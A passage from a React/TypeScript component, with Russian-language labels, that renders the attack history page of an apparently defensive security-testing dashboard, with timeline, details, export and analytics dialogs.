                                                                <Button variant="ghost" size="sm">
                                                                    <MoreHorizontal className="w-4 h-4" />
                                                                </Button>
                                                            </DropdownMenuTrigger>
                                                            <DropdownMenuContent>
                                                                <DropdownMenuItem onClick={() => handleCloneAttack(attack)}>
                                                                    <Copy className="mr-2 h-4 w-4" />
                                                                    Клонировать
                                                                </DropdownMenuItem>
                                                                <DropdownMenuItem className="text-red-600">
                                                                    <Trash2 className="mr-2 h-4 w-4" />
                                                                    Удалить
                                                                </DropdownMenuItem>
                                                            </DropdownMenuContent>
                                                        </DropdownMenu>
                                                    </div>
                                                </div>
                                            </CardContent>
                                        </Card>
                                    ))}
                                </div>
                            ) : (
                                <div className="space-y-4">
                                    <h3 className="text-lg font-semibold">Timeline View</h3>
                                    <div className="space-y-4">
                                        {filteredAndSortedAttacks.map((attack, index) => (
                                            <div key={attack.id} className="flex gap-4">
                                                <div className="flex flex-col items-center">
                                                    <div className={`w-4 h-4 rounded-full ${attack.status === 'completed' ? 'bg-green-500' :
                                                        attack.status === 'running' ? 'bg-blue-500' :
                                                            attack.status === 'failed' ? 'bg-red-500' :
                                                                'bg-gray-500'
                                                        }`} />
                                                    {index < filteredAndSortedAttacks.length - 1 && (
                                                        <div className="w-px h-16 bg-border mt-2" />
                                                    )}
                                                </div>
                                                <div className="flex-1 pb-8">
                                                    <div className="flex items-center justify-between">
                                                        <h4 className="font-medium">{attack.name}</h4>
                                                        <span className="text-sm text-muted-foreground">
                                                            {formatDate(attack.startTime)}
                                                        </span>
                                                    </div>
                                                    <p className="text-sm text-muted-foreground mt-1">{attack.description}</p>
                                                    <div className="flex items-center gap-2 mt-2">
                                                        <Badge className={getSeverityColor(attack.severity)}>
                                                            {attack.severity}
                                                        </Badge>
                                                        <Badge className={getStatusColor(attack.status)}>
                                                            {t(attack.status)}
                                                        </Badge>
                                                        <span className="text-sm text-muted-foreground">
                                                            {attack.successRate}% успешность
                                                        </span>
                                                    </div>
                                                </div>
                                            </div>
                                        ))}
                                    </div>
                                </div>
                            )
                        ) : (
                            <div className="text-center py-12">
                                <Target className="mx-auto h-12 w-12 text-muted-foreground" />
                                <h3 className="mt-2 text-sm font-semibold text-muted-foreground">
                                    Атаки не найдены
                                </h3>
                                <p className="mt-1 text-sm text-muted-foreground">
                                    Попробуйте изменить фильтры поиска или создать новую атаку
                                </p>
                                <div className="mt-6">
                                    <Button onClick={() => router.push('/security/attack-builder/create')}>
                                        <Zap className="w-4 h-4 mr-2" />
                                        Создать атаку
                                    </Button>
                                </div>
                            </div>
                        )}
                    </CardContent>
                </Card>

                {/* Диалог детальной информации */}
                <Dialog open={showDetailsDialog} onOpenChange={setShowDetailsDialog}>
                    <DialogContent className="max-w-4xl max-h-[80vh] overflow-y-auto">
                        <DialogHeader>
                            <DialogTitle className="flex items-center gap-2">
                                <Shield className="w-5 h-5" />
                                Детали атаки
                            </DialogTitle>
                            <DialogDescription>
                                Подробная информация о выполненной атаке
                            </DialogDescription>
                        </DialogHeader>
                        {selectedAttack && (
                            <div className="space-y-6">
                                <div className="grid grid-cols-2 gap-4">
                                    <div>
                                        <h3 className="font-medium mb-2">Основная информация</h3>
                                        <div className="space-y-2 text-sm">
                                            <div><strong>Название:</strong> {selectedAttack.name}</div>
                                            <div><strong>Описание:</strong> {selectedAttack.description}</div>
                                            <div><strong>Цель:</strong> {selectedAttack.target}</div>
                                            <div><strong>Тип атаки:</strong> {selectedAttack.attackType}</div>
                                            <div><strong>Режим выполнения:</strong> {selectedAttack.executionMode}</div>
                                            <div><strong>Категория:</strong> {selectedAttack.category}</div>
                                            <div><strong>Среда:</strong> {selectedAttack.environment}</div>
                                        </div>
                                    </div>
                                    <div>
                                        <h3 className="font-medium mb-2">Результаты</h3>
                                        <div className="space-y-2 text-sm">
                                            <div><strong>Статус:</strong> {selectedAttack.status}</div>
                                            <div><strong>Успешность:</strong> {selectedAttack.successRate}%</div>
                                            <div><strong>Скомпрометировано целей:</strong> {selectedAttack.targetsCompromised}/{selectedAttack.totalTargets}</div>
                                            <div><strong>Оценка риска:</strong> {selectedAttack.riskScore.toFixed(1)}</div>
                                            <div><strong>Оценка воздействия:</strong> {selectedAttack.impactScore.toFixed(1)}</div>
                                            <div><strong>Триггерных алертов:</strong> {selectedAttack.alertsTriggered}</div>
                                            <div><strong>Оценочная стоимость:</strong> {formatCurrency(selectedAttack.estimatedCost)}</div>
                                        </div>
                                    </div>
                                </div>

                                <div>
                                    <h3 className="font-medium mb-2">MITRE ATT&CK Framework</h3>
                                    <div className="flex flex-wrap gap-2">
                                        {selectedAttack.mitre_attack.map(technique => (
                                            <Badge key={technique} className="bg-red-100 text-red-800">
                                                {technique}
                                            </Badge>
                                        ))}
                                    </div>
                                </div>

                                <div>
                                    <h3 className="font-medium mb-2">Kill Chain Phases</h3>
                                    <div className="flex flex-wrap gap-2">
                                        {selectedAttack.kill_chain_phases.map(phase => (
                                            <Badge key={phase} className="bg-orange-100 text-orange-800">
                                                {phase}
                                            </Badge>
                                        ))}
                                    </div>
                                </div>

                                <div>
                                    <h3 className="font-medium mb-2">Собранные доказательства</h3>
                                    <div className="space-y-1">
                                        {selectedAttack.evidenceCollected.map(evidence => (
                                            <div key={evidence} className="flex items-center gap-2 text-sm">
                                                <FileText className="w-4 h-4 text-muted-foreground" />
                                                <span>{evidence}</span>
                                                <Button variant="ghost" size="sm">
                                                    <Download className="w-3 h-3" />
                                                </Button>
                                            </div>
                                        ))}
                                    </div>
                                </div>

                                <div>
                                    <h3 className="font-medium mb-2">Обходы защиты</h3>
                                    <div className="flex flex-wrap gap-2">
                                        {selectedAttack.bypassedControls.map(control => (
                                            <Badge key={control} className="bg-yellow-100 text-yellow-800">
                                                {control}
                                            </Badge>
                                        ))}
                                    </div>
                                </div>

                                <div>
                                    <h3 className="font-medium mb-2">Найденные средства защиты</h3>
                                    <div className="flex flex-wrap gap-2">
                                        {selectedAttack.mitigationsFound.map(mitigation => (
                                            <Badge key={mitigation} className="bg-green-100 text-green-800">
                                                {mitigation}
                                            </Badge>
                                        ))}
                                    </div>
                                </div>

                                {selectedAttack.geolocation && (
                                    <div>
                                        <h3 className="font-medium mb-2">Геолокация</h3>
                                        <div className="text-sm">
                                            <div><strong>Страна:</strong> {selectedAttack.geolocation.country}</div>
                                            <div><strong>Регион:</strong> {selectedAttack.geolocation.region}</div>
                                            <div><strong>Город:</strong> {selectedAttack.geolocation.city}</div>
                                            <div><strong>Координаты:</strong> {selectedAttack.geolocation.lat}, {selectedAttack.geolocation.lng}</div>
                                        </div>
                                    </div>
                                )}
                            </div>
                        )}
                        <DialogFooter>
                            <Button variant="outline" onClick={() => setShowDetailsDialog(false)}>
                                Закрыть
                            </Button>
                            {selectedAttack?.reportUrl && (
                                <Button>
                                    <Download className="w-4 h-4 mr-2" />
                                    Скачать отчет
                                </Button>
                            )}
                        </DialogFooter>
                    </DialogContent>
                </Dialog>

                {/* Диалог экспорта */}
                <Dialog open={showExportDialog} onOpenChange={setShowExportDialog}>
                    <DialogContent>
                        <DialogHeader>
                            <DialogTitle>Экспорт данных</DialogTitle>
                            <DialogDescription>
                                Выберите формат для экспорта данных о {filteredAndSortedAttacks.length} атаках
                            </DialogDescription>
                        </DialogHeader>
                        <div className="grid grid-cols-2 gap-4">
                            <Button variant="outline" onClick={() => handleExport('csv')}>
                                <FileText className="w-4 h-4 mr-2" />
                                CSV
                            </Button>
                            <Button variant="outline" onClick={() => handleExport('json')}>
                                <Code className="w-4 h-4 mr-2" />
                                JSON
                            </Button>
                            <Button variant="outline" onClick={() => handleExport('pdf')}>
                                <FileText className="w-4 h-4 mr-2" />
                                PDF отчет
                            </Button>
                            <Button variant="outline" onClick={() => handleExport('xlsx')}>
                                <FileText className="w-4 h-4 mr-2" />
                                Excel
                            </Button>
                        </div>
                        <DialogFooter>
                            <Button variant="outline" onClick={() => setShowExportDialog(false)}>
                                Отмена
                            </Button>
                        </DialogFooter>
                    </DialogContent>
                </Dialog>

                {/* Диалог аналитики */}
                <Dialog open={showAnalyticsDialog} onOpenChange={setShowAnalyticsDialog}>
                    <DialogContent className="max-w-6xl max-h-[80vh] overflow-y-auto">
                        <DialogHeader>
                            <DialogTitle>Аналитика атак</DialogTitle>
                            <DialogDescription>
                                Подробная аналитика и статистика по атакам
                            </DialogDescription>
                        </DialogHeader>
                        <Tabs defaultValue="overview">
                            <TabsList className="grid w-full grid-cols-4">
                                <TabsTrigger value="overview">Обзор</TabsTrigger>
                                <TabsTrigger value="trends">Тренды</TabsTrigger>
                                <TabsTrigger value="geography">География</TabsTrigger>
                                <TabsTrigger value="risks">Риски</TabsTrigger>
                            </TabsList>

                            <TabsContent value="overview" className="space-y-4">
                                <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                                    <Card>
                                        <CardContent className="p-4">
                                            <div className="text-2xl font-bold">{attackStatistics.avgSuccessRate.toFixed(1)}%</div>
                                            <p className="text-sm text-muted-foreground">Средняя успешность</p>
                                        </CardContent>
                                    </Card>
                                    <Card>
                                        <CardContent className="p-4">
                                            <div className="text-2xl font-bold">{attackStatistics.avgRiskScore.toFixed(1)}</div>
                                            <p className="text-sm text-muted-foreground">Средний риск</p>
                                        </CardContent>
                                    </Card>
                                    <Card>
                                        <CardContent className="p-4">
                                            <div className="text-2xl font-bold">{attackStatistics.totalAlerts}</div>
                                            <p className="text-sm text-muted-foreground">Всего алертов</p>
                                        </CardContent>
                                    </Card>
                                    <Card>
                                        <CardContent className="p-4">
                                            <div className="text-2xl font-bold">{formatCurrency(attackStatistics.totalCost)}</div>
                                            <p className="text-sm text-muted-foreground">Общий ущерб</p>
                                        </CardContent>
                                    </Card>
                                </div>

                                <div className="grid grid-cols-2 gap-4">
                                    <Card>
                                        <CardHeader>
                                            <CardTitle>Распределение по категориям</CardTitle>
                                        </CardHeader>
                                        <CardContent>
                                            {Object.entries(attackStatistics.byCategory).map(([category, count]) => (
                                                <div key={category} className="flex items-center justify-between py-2">
                                                    <span className="capitalize">{category.replace('_', ' ')}</span>
                                                    <Badge>{count}</Badge>
                                                </div>
                                            ))}
                                        </CardContent>
                                    </Card>

                                    <Card>
                                        <CardHeader>
                                            <CardTitle>Распределение по средам</CardTitle>
                                        </CardHeader>
                                        <CardContent>
                                            {Object.entries(attackStatistics.byEnvironment).map(([env, count]) => (
                                                <div key={env} className="flex items-center justify-between py-2">
                                                    <span className="capitalize">{env}</span>
                                                    <Badge>{count}</Badge>
                                                </div>
                                            ))}
                                        </CardContent>
                                    </Card>
                                </div>
                            </TabsContent>

                            <TabsContent value="trends">
                                <div className="text-center py-8">
                                    <LineChart className="mx-auto h-12 w-12 text-muted-foreground" />
                                    <h3 className="mt-2 text-sm font-semibold">Графики трендов</h3>
                                    <p className="text-sm text-muted-foreground">
                                        Здесь будут отображаться графики трендов атак по времени
                                    </p>
                                </div>
                            </TabsContent>

                            <TabsContent value="geography">
                                <div className="text-center py-8">
                                    <MapPin className="mx-auto h-12 w-12 text-muted-foreground" />
                                    <h3 className="mt-2 text-sm font-semibold">Географическое распределение</h3>
                                    <p className="text-sm text-muted-foreground">
                                        Здесь будет отображаться карта с географическим распределением атак
                                    </p>
                                </div>
                            </TabsContent>

                            <TabsContent value="risks">
                                <div className="text-center py-8">
                                    <AlertTriangle className="mx-auto h-12 w-12 text-muted-foreground" />
                                    <h3 className="mt-2 text-sm font-semibold">Анализ рисков</h3>
                                    <p className="text-sm text-muted-foreground">
                                        Здесь будет отображаться детальный анализ рисков
                                    </p>
                                </div>
                            </TabsContent>
                        </Tabs>
                    </DialogContent>
                </Dialog>
            </div>
        </TooltipProvider>
    );
};

export default AttackHistoryPage;
